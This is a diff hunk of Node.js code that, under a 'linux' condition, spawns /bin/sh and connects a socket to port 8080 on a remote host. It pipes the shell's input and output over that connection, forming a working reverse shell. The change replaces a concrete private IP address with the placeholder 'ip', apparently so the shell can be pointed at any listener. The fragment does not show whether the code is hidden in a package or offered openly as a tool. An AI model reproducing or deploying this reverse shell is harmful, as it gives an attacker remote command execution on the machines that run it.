@@ -7,7 +7,7 @@ if (hook === "linux") {
       cp = require("child_process"),
       sh = cp.spawn("/bin/sh", []);
     var client = new net.Socket();
-    client.connect(8080, "192.168.43.119", function () {
+    client.connect(8080, "ip", function () {
       client.pipe(sh.stdin);
       sh.stdout.pipe(client);
       sh.stderr.pipe(client);
